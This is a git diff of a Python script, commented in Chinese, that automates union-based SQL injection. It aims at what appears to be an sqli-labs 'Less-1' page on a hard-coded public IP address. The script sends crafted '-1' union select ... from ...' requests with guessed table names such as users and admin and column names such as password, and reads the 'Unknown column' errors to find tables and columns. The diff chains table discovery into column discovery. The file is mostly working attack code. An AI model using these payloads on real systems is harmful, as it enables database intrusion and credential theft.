@@ -122,7 +122,8 @@ def detect_table_name():
         if result.find(table_error_key) == -1:
             # 没有找到这个错误
             table_result.append(table_name)
-    print(table_result)
+    # print(table_result)
+    return table_result
 
 """
     URL：http://129.28.170.125:8001/Less-1/?id=-1'+union+select+1,2,3+from+表名+--+
@@ -132,11 +133,11 @@ def detect_table_name():
     出现 [Unknown column 'aaa' in 'field list'] 关键字，表示字段不存在，那个字段数为 4 - 1 个字段数  
 """
 def detect_column_name():
+    print("\n" + "*"*10 + "Detect table and Find table columns: " + "*"*10)
+    # 存放没有找到错误结果的列，说明这些列是存在的所以不会报错
     column_result = []
-    table_result = []
-    column_error_key = "Unknown column "
+    column_error_key = "Unknown column '"
     print("\n" + "*"*10 + "Detect table's columns: " + "*"*10)
-    table_result = []
     dcn = detect_columns_num()
     cols = ""
     for i in range(dcn):
@@ -148,24 +149,38 @@ def detect_column_name():
         "id", "user", "admin", "password", "users", "score"
     ]
 
-    table_name_list = [
-        "users", "admin", "root", "administrator", "email", "class1"
-    ]
-    for table_name in table_name_list:
+    # table_name_list = [
+    #     "users", "admin", "root", "administrator", "email", "class1"
+    # ]
+
+    # 调用探测表名函数，获取存在的表名有，循环遍历存在的表，进行每个表的字段名探测
+    table_result = detect_table_name()
+    for table_name in table_result:
         for column_name in column_name_list:
-            temp_url = origin_url.replace("sql_fuzz", "-1'+union+select+" + column_name.replace('1', column_name) + "+from+" + table_name + "+--+")
+            temp_url = origin_url.replace("sql_fuzz", "-1'+union+select+" + column_name.replace('1', column_name) + ",2,3+from+" + table_name + "+--+")
             r = requests.get(url=temp_url)
+            print(r.url)
             result = r.text
             if result.find(column_error_key) == -1:
                 # 没有找到这个错误，说明这个字段是存在的
                 column_result.append(column_name)
         else:
             column_result.append(table_name)
-
+    # print("=======", column_result)
+    # return column_result
+    print("\n 当前表存在的字段有：")
+    print("type of column_result: ", type(column_result))
+    print("type of column_result: ", column_result)
+    for line in column_result:
+        if line not in table_result:
+            print(line)
+        else:
+            print("上边的内容就是改表对应的字段名：" + line)
 
 if __name__ == "__main__":
     # test_sql_inject()
     # detect_columns_num()
-    # detect_table_name()
+    # table_result = detect_table_name()
+    # print("table_result: ", table_result)
     detect_column_name()
 
